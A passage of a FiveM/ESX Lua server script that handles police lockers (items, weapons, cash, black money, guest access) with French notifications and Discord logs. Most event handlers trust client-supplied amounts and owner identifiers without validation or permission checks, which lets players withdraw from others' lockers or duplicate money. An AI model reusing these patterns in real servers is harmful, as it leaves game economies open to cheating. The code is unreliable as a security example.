			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté un casier a "..xTarget.getName()..".")
			TriggerClientEvent('esx:showNotification', _target, ""..xPlayer.getName().." vous a créé un casier.")
			logsdisc("```"..xPlayer.getName().." a creer un casier à "..xTarget.getName()..".```", Config.logs.CasierPolice)
        end
    end)
	end
end)


RegisterServerEvent('yazho:removeCasier')
AddEventHandler('yazho:removeCasier', function(target)
	local _src = source
	local _target = target
	local xPlayer = ESX.GetPlayerFromId(_src)
	local xTarget = ESX.GetPlayerFromId(_target)
	if xPlayer.job.name == 'police' then
		MySQL.Async.fetchAll('SELECT * FROM casierlspd WHERE owner = @owner', {
		['@owner'] = xTarget.identifier
		}, function(result)
			if result[1] then
				MySQL.Async.execute('DELETE FROM casierlspd WHERE owner = @owner', {
				['@owner'] = xTarget.identifier
				})
				
				if Config.deleteContent then
					MySQL.Async.execute('DELETE FROM casierlspdcontent WHERE owner = @owner', {
					['@owner'] = xTarget.identifier
					})
				end
				TriggerClientEvent('esx:showNotification', _src, "Vous avez supprimé le casier de "..xTarget.getName()..".")
				TriggerClientEvent('esx:showNotification', _target, ""..xPlayer.getName().." vous a supprimé votre casier.")
				logsdisc("```"..xPlayer.getName().." a supprimer le casier de "..xTarget.getName()..".```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~"..xTarget.getName().." n'a pas de casier.")
			end
		end)
	end
end)


ESX.RegisterServerCallback('yazho:getAllContentCasier', function(source, cb)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner', {['@owner'] = xPlayer.identifier}, function(result)
		cb(result)
	end)
end)


ESX.RegisterServerCallback('yazho:getAllWeaponInCasier', function(source, cb)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = xPlayer.identifier,
		['@type'] = "weapon"
	}, function(result)
		for _,v in pairs(result) do
			local weaponLabel = ESX.GetWeaponLabel(v.name)
			if weaponLabel then
				v.label = weaponLabel
			end
		end
		cb(result)
	end)
end)


ESX.RegisterServerCallback('yazho:getAllItemsInCasier', function(source, cb)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = xPlayer.identifier,
		['@type'] = "item"
	}, function(result)
		for _,v in pairs(result) do
			local itemLabel = ESX.GetItemLabel(v.name)
			if itemLabel then
				v.label = itemLabel
			end
		end
		cb(result)
	end)
end)


RegisterServerEvent('yazho:addItemToCasier')
AddEventHandler('yazho:addItemToCasier', function(itemName, amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = xPlayer.identifier,
		['@type'] = "item",
		['@name'] = itemName
	}, function(result)
		if result[1] then
			MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
				['@owner'] = xPlayer.identifier,
				['@type'] = "item",
				['@name'] = itemName,
				['@amount'] = result[1].amount + amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..itemName.." dans le casier.")
			xPlayer.removeInventoryItem(itemName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..itemName.." dans le casier.```", Config.logs.CasierPolice)
		else
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, name, amount) VALUES (@owner, @type, @name, @amount)', {
				['@owner'] = xPlayer.identifier,
				['@type'] = "item",
				['@name'] = itemName,
				['@amount'] = amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..itemName.." dans le casier.")
			xPlayer.removeInventoryItem(itemName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..itemName.." dans le casier.```", Config.logs.CasierPolice)
		end
	end)
end)


RegisterServerEvent('yazho:removeItemFromCasier')
AddEventHandler('yazho:removeItemFromCasier', function(itemName, amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = xPlayer.identifier,
		['@type'] = "item",
		['@name'] = itemName
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				if result[1].amount - amount == 0 then
					MySQL.Async.execute('DELETE FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = xPlayer.identifier,
						['@type'] = "item",
						['@name'] = itemName
					})
				else
					MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = xPlayer.identifier,
						['@type'] = "item",
						['@name'] = itemName,
						['@amount'] = result[1].amount - amount
					})
				end
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré "..amount.." "..itemName.." du casier.")
				xPlayer.addInventoryItem(itemName, amount)
				logsdisc("```"..xPlayer.getName().." a retiré "..amount.." "..itemName.." du casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'"..itemName.." dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas de "..itemName.." dans le casier.")
		end
	end)
end)


RegisterServerEvent('yazho:addWeaponToCasier')
AddEventHandler('yazho:addWeaponToCasier', function(weaponName, amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = xPlayer.identifier,
		['@type'] = "weapon",
		['@name'] = weaponName
	}, function(result)
		if result[1] then
			MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
				['@owner'] = xPlayer.identifier,
				['@type'] = "weapon",
				['@name'] = weaponName,
				['@amount'] = result[1].amount + amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..weaponName.." dans le casier.")
			xPlayer.removeWeapon(weaponName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..weaponName.." dans le casier.```", Config.logs.CasierPolice)
		else
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, name, amount) VALUES (@owner, @type, @name, @amount)', {
				['@owner'] = xPlayer.identifier,
				['@type'] = "weapon",
				['@name'] = weaponName,
				['@amount'] = amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..weaponName.." dans le casier.")
			xPlayer.removeWeapon(weaponName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..weaponName.." dans le casier.```", Config.logs.CasierPolice)
		end
	end)
end)


RegisterServerEvent('yazho:removeWeaponFromCasier')
AddEventHandler('yazho:removeWeaponFromCasier', function(weaponName, amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = xPlayer.identifier,
		['@type'] = "weapon",
		['@name'] = weaponName
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				if result[1].amount - amount == 0 then
					MySQL.Async.execute('DELETE FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = xPlayer.identifier,
						['@type'] = "weapon",
						['@name'] = weaponName
					})
				else
					MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = xPlayer.identifier,
						['@type'] = "weapon",
						['@name'] = weaponName,
						['@amount'] = result[1].amount - amount
					})
				end
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré "..amount.." "..weaponName.." du casier.")
				xPlayer.addWeapon(weaponName, amount)
				logsdisc("```"..xPlayer.getName().." a retiré "..amount.." "..weaponName.." du casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'"..weaponName.." dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas de "..weaponName.." dans le casier.")
		end
	end)
end)


RegisterServerEvent('yazho:addPlayerToCasier')
AddEventHandler('yazho:addPlayerToCasier', function(target)
	local _src = source
	local _target = target
	local xPlayer = ESX.GetPlayerFromId(_src)
	local xTarget = ESX.GetPlayerFromId(_target)
	MySQL.Async.fetchAll('SELECT * FROM casierlspd WHERE owner = @owner', {
		['@owner'] = xPlayer.identifier,
	}, function(result)
		local casierGuest = json.decode(result[1].guest)
		if casierGuest then
			if not casierGuest[xTarget.identifier] then
				casierGuest[xTarget.identifier] = {}
				MySQL.Async.execute('UPDATE casierlspd SET guest = @guest WHERE owner = @owner', {
					['@owner'] = xPlayer.identifier,
					['@guest'] = json.encode(casierGuest)
				})
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..xTarget.name.." dans le casier.")
				TriggerClientEvent('esx:showNotification', _target, "Vous avez été ajouté dans le casier de "..xPlayer.name..".")
				logsdisc("```"..xPlayer.getName().." a ajouté "..xTarget.getName().." dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous avez déjà ajouté "..xTarget.name.." dans le casier.")
			end
		else
			local casierGuest = {}
			casierGuest[xTarget.identifier] = {}
			MySQL.Async.execute('UPDATE casierlspd SET guest = @guest WHERE owner = @owner', {
				['@owner'] = xPlayer.identifier,
				['@guest'] = json.encode(casierGuest)
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..xTarget.name.." dans le casier.")
			TriggerClientEvent('esx:showNotification', _target, "Vous avez été ajouté dans le casier de "..xPlayer.name..".")
			logsdisc("```"..xPlayer.getName().." a ajouté "..xTarget.getName().." dans le casier.```", Config.logs.CasierPolice)
		end
	end)
end)


RegisterServerEvent('yazho:removePlayerFromCasier')
AddEventHandler('yazho:removePlayerFromCasier', function(target)
	local _src = source
	local _target = target
	local xPlayer = ESX.GetPlayerFromId(_src)
	local xTarget = ESX.GetPlayerFromId(_target)
	MySQL.Async.fetchAll('SELECT * FROM casierlspd WHERE owner = @owner', {
		['@owner'] = xPlayer.identifier,
	}, function(result)
		local casierGuest = json.decode(result[1].guest)
		if casierGuest then
			if casierGuest[xTarget.identifier] then
				casierGuest[xTarget.identifier] = nil
				MySQL.Async.execute('UPDATE casierlspd SET guest = @guest WHERE owner = @owner', {
					['@owner'] = xPlayer.identifier,
					['@guest'] = json.encode(casierGuest)
				})
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré "..xTarget.name.." du casier.")
				TriggerClientEvent('esx:showNotification', _target, "Vous avez été retiré du casier de "..xPlayer.name..".")
				logsdisc("```"..xPlayer.getName().." a retiré "..xTarget.getName().." du casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas ajouté "..xTarget.name.." dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas ajouté "..xTarget.name.." dans le casier.")
		end
	end)
end)


RegisterServerEvent('yazho:clearCasier')
AddEventHandler('yazho:clearCasier', function()
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspd WHERE owner = @owner', {
		['@owner'] = xPlayer.identifier,
	}, function(result)
		local casierGuest = json.decode(result[1].guest)
		if casierGuest then
			casierGuest = {}
			MySQL.Async.execute('UPDATE casierlspd SET guest = @guest WHERE owner = @owner', {
				['@owner'] = xPlayer.identifier,
				['@guest'] = json.encode(casierGuest)
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez vidé le casier.")
			logsdisc("```"..xPlayer.getName().." a vidé le casier.```", Config.logs.CasierPolice)
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas ajouté dans le casier.")
		end
	end)
end)


RegisterServerEvent('yazho:addMoneyToCasier')
AddEventHandler('yazho:addMoneyToCasier', function(amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	local myCash = xPlayer.getMoney()
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = xPlayer.identifier,
		['@type'] = 'cash'
	}, function(result)
		if result[1] then
			if myCash >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'cash',
					['@amount'] = result[1].amount + amount
				})
				xPlayer.removeMoney(amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		else
			if myCash >= amount then
				MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'cash',
					['@amount'] = amount
				})
				xPlayer.removeMoney(amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		end
	end)
end)


RegisterServerEvent('yazho:removeMoneyFromCasier')
AddEventHandler('yazho:removeMoneyFromCasier', function(amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)	
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = xPlayer.identifier,
		['@type'] = 'cash'
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'cash',
					['@amount'] = result[1].amount - amount
				})
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré $"..amount.." dans le casier.")
				xPlayer.addMoney(amount)
				logsdisc("```"..xPlayer.getName().." a retiré $"..amount.." dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'cash',
					['@amount'] = 0
			})
		end
	end)
end)


RegisterServerEvent('yazho:addBlackMoneyToCasier')
AddEventHandler('yazho:addBlackMoneyToCasier', function(amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	local myCash = xPlayer.getAccount('black_money').money
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = xPlayer.identifier,
		['@type'] = 'blackmoney'
	}, function(result)
		if result[1] then
			if myCash >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'blackmoney',
					['@amount'] = result[1].amount + amount
				})
				xPlayer.removeAccountMoney('black_money', amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." d'argent sale dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		else
			if myCash >= amount then
				MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'blackmoney',
					['@amount'] = amount
				})
				xPlayer.removeAccountMoney('black_money', amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." d'argent sale dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		end
	end)
end)


RegisterServerEvent('yazho:removeBlackMoneyFromCasier')
AddEventHandler('yazho:removeBlackMoneyFromCasier', function(amount)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = xPlayer.identifier,
		['@type'] = 'blackmoney'
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'blackmoney',
					['@amount'] = result[1].amount - amount
				})
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré $"..amount.." dans le casier.")
				xPlayer.addAccountMoney('black_money', amount)
				logsdisc("```"..xPlayer.getName().." a retiré $"..amount.." d'argent sale dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = xPlayer.identifier,
					['@type'] = 'blackmoney',
					['@amount'] = 0
			})
		end
	end)
end)



ESX.RegisterServerCallback('yazho:getAllContentCasier2', function(source, cb, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner', {['@owner'] = identifier}, function(result)
		cb(result)
	end)
end)


ESX.RegisterServerCallback('yazho:getAllWeaponInCasier2', function(source, cb, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = identifier,
		['@type'] = "weapon"
	}, function(result)
		for _,v in pairs(result) do
			local weaponLabel = ESX.GetWeaponLabel(v.name)
			if weaponLabel then
				v.label = weaponLabel
			end
		end
		cb(result)
	end)
end)


ESX.RegisterServerCallback('yazho:getAllItemsInCasier2', function(source, cb, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = identifier,
		['@type'] = "item"
	}, function(result)
		for _,v in pairs(result) do
			local itemLabel = ESX.GetItemLabel(v.name)
			if itemLabel then
				v.label = itemLabel
			end
		end
		cb(result)
	end)
end)


RegisterServerEvent('yazho:addMoneyToCasier2')
AddEventHandler('yazho:addMoneyToCasier2', function(amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	local myCash = xPlayer.getMoney()
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = identifier,
		['@type'] = 'cash'
	}, function(result)
		if result[1] then
			if myCash >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = identifier,
					['@type'] = 'cash',
					['@amount'] = result[1].amount + amount
				})
				xPlayer.removeMoney(amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." d'argent dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		else
			if myCash >= amount then
				MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = identifier,
					['@type'] = 'cash',
					['@amount'] = amount
				})
				xPlayer.removeMoney(amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." d'argent dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		end
	end)
end)


RegisterServerEvent('yazho:removeMoneyFromCasier2')
AddEventHandler('yazho:removeMoneyFromCasier2', function(amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)	
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = identifier,
		['@type'] = 'cash'
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = identifier,
					['@type'] = 'cash',
					['@amount'] = result[1].amount - amount
				})
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré $"..amount.." dans le casier.")
				xPlayer.addMoney(amount)
				logsdisc("```"..xPlayer.getName().." a retiré $"..amount.." d'argent dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = identifier,
					['@type'] = 'cash',
					['@amount'] = 0
			})
		end
	end)
end)


RegisterServerEvent('yazho:addBlackMoneyToCasier2')
AddEventHandler('yazho:addBlackMoneyToCasier2', function(amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	local myCash = xPlayer.getAccount('black_money').money
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = identifier,
		['@type'] = 'blackmoney'
	}, function(result)
		if result[1] then
			if myCash >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = identifier,
					['@type'] = 'blackmoney',
					['@amount'] = result[1].amount + amount
				})
				xPlayer.removeAccountMoney('black_money', amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." d'argent sale dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		else
			if myCash >= amount then
				MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = identifier,
					['@type'] = 'blackmoney',
					['@amount'] = amount
				})
				xPlayer.removeAccountMoney('black_money', amount)
				TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté $"..amount.." dans le casier.")
				logsdisc("```"..xPlayer.getName().." a ajouté $"..amount.." d'argent sale dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent.")
			end
		end
	end)
end)


RegisterServerEvent('yazho:removeBlackMoneyFromCasier2')
AddEventHandler('yazho:removeBlackMoneyFromCasier2', function(amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type', {
		['@owner'] = identifier,
		['@type'] = 'blackmoney'
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type', {
					['@owner'] = identifier,
					['@type'] = 'blackmoney',
					['@amount'] = result[1].amount - amount
				})
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré $"..amount.." dans le casier.")
				xPlayer.addAccountMoney('black_money', amount)
				logsdisc("```"..xPlayer.getName().." a retiré $"..amount.." d'argent sale dans le casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'argent dans le casier.")
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, amount) VALUES (@owner, @type, @amount)', {
					['@owner'] = identifier,
					['@type'] = 'blackmoney',
					['@amount'] = 0
			})
		end
	end)
end)

RegisterServerEvent('yazho:addItemToCasier2')
AddEventHandler('yazho:addItemToCasier2', function(itemName, amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = identifier,
		['@type'] = "item",
		['@name'] = itemName
	}, function(result)
		if result[1] then
			MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
				['@owner'] = identifier,
				['@type'] = "item",
				['@name'] = itemName,
				['@amount'] = result[1].amount + amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..itemName.." dans le casier.")
			xPlayer.removeInventoryItem(itemName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..itemName.." dans le casier.```", Config.logs.CasierPolice)
		else
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, name, amount) VALUES (@owner, @type, @name, @amount)', {
				['@owner'] = identifier,
				['@type'] = "item",
				['@name'] = itemName,
				['@amount'] = amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..itemName.." dans le casier.")
			xPlayer.removeInventoryItem(itemName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..itemName.." dans le casier.```", Config.logs.CasierPolice)
		end
	end)
end)


RegisterServerEvent('yazho:removeItemFromCasier2')
AddEventHandler('yazho:removeItemFromCasier2', function(itemName, amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = identifier,
		['@type'] = "item",
		['@name'] = itemName
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				if result[1].amount - amount == 0 then
					MySQL.Async.execute('DELETE FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = identifier,
						['@type'] = "item",
						['@name'] = itemName
					})
				else
					MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = identifier,
						['@type'] = "item",
						['@name'] = itemName,
						['@amount'] = result[1].amount - amount
					})
				end
				TriggerClientEvent('esx:showNotification', _src, "Vous avez retiré "..amount.." "..itemName.." du casier.")
				xPlayer.addInventoryItem(itemName, amount)
				logsdisc("```"..xPlayer.getName().." a retiré "..amount.." "..itemName.." du casier.```", Config.logs.CasierPolice)
			else
				TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas assez d'"..itemName.." dans le casier.")
			end
		else
			TriggerClientEvent('esx:showNotification', _src, "~r~Vous n'avez pas de "..itemName.." dans le casier.")
		end
	end)
end)


RegisterServerEvent('yazho:addWeaponToCasier2')
AddEventHandler('yazho:addWeaponToCasier2', function(weaponName, amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = identifier,
		['@type'] = "weapon",
		['@name'] = weaponName
	}, function(result)
		if result[1] then
			MySQL.Async.execute('UPDATE casierlspdcontent SET amount = @amount WHERE owner = @owner AND type = @type AND name = @name', {
				['@owner'] = identifier,
				['@type'] = "weapon",
				['@name'] = weaponName,
				['@amount'] = result[1].amount + amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..weaponName.." dans le casier.")
			xPlayer.removeWeapon(weaponName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..weaponName.." dans le casier.```", Config.logs.CasierPolice)
		else
			MySQL.Async.execute('INSERT INTO casierlspdcontent (owner, type, name, amount) VALUES (@owner, @type, @name, @amount)', {
				['@owner'] = identifier,
				['@type'] = "weapon",
				['@name'] = weaponName,
				['@amount'] = amount
			})
			TriggerClientEvent('esx:showNotification', _src, "Vous avez ajouté "..amount.." "..weaponName.." dans le casier.")
			xPlayer.removeWeapon(weaponName, amount)
			logsdisc("```"..xPlayer.getName().." a ajouté "..amount.." "..weaponName.." dans le casier.```", Config.logs.CasierPolice)
		end
	end)
end)


RegisterServerEvent('yazho:removeWeaponFromCasier2')
AddEventHandler('yazho:removeWeaponFromCasier2', function(weaponName, amount, identifier)
	local _src = source
	local xPlayer = ESX.GetPlayerFromId(_src)
	MySQL.Async.fetchAll('SELECT * FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
		['@owner'] = identifier,
		['@type'] = "weapon",
		['@name'] = weaponName
	}, function(result)
		if result[1] then
			if result[1].amount >= amount then
				if result[1].amount - amount == 0 then
					MySQL.Async.execute('DELETE FROM casierlspdcontent WHERE owner = @owner AND type = @type AND name = @name', {
						['@owner'] = identifier,
